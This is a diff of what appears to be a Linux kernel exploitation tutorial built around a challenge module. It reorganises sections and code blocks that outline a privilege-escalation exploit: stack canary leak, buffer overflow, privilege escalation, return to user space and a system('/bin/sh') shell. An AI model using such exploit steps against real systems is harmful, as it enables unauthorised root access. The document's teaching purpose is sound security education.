@@ -53,7 +53,7 @@ void save_user_space()
 ## Restoring the Initial State
 ...
 
-```
+```c
 void load_user_space(unsigned long target)
 {
     /* return to user-space */
@@ -90,6 +90,8 @@ mov    rdi, rax
 call   rbx
 ```
 
+...
+
 ```c
 void escalate_privileges()
 {
@@ -121,6 +123,8 @@ unsigned long leak_canary(int fd)
 }
 ```
 
+...
+
 ```c
 void overflow_buffer(int fd, unsigned long canary)
 {
@@ -132,14 +136,14 @@ void overflow_buffer(int fd, unsigned long canary)
 ## Putting it All Together
 ...
 
-[exploit.c](/files/linux-kernel/1/exploit.c)
-
 ```c
 void shell()
 {
     system("/bin/sh");
 }
 ```
+
+...
 
 ```c
 int main(int argc, char **argv)
@@ -158,6 +162,10 @@ int main(int argc, char **argv)
     return 0;
 }
 ```
+
+...
+
+[exploit.c](/files/linux-kernel/1/exploit.c)
 
 {{< code language="c" title="exploit.c" id="6" expand="Show" collapse="Hide" isCollapsed="true" >}}
 #include <stdio.h>
@@ -259,6 +267,8 @@ int main(int argc, char **argv)
 ```
 ~/ $ gcc exploit.c -o exploit -static
 ```
+
+...
 
 ```
 / # insmod challenge.ko
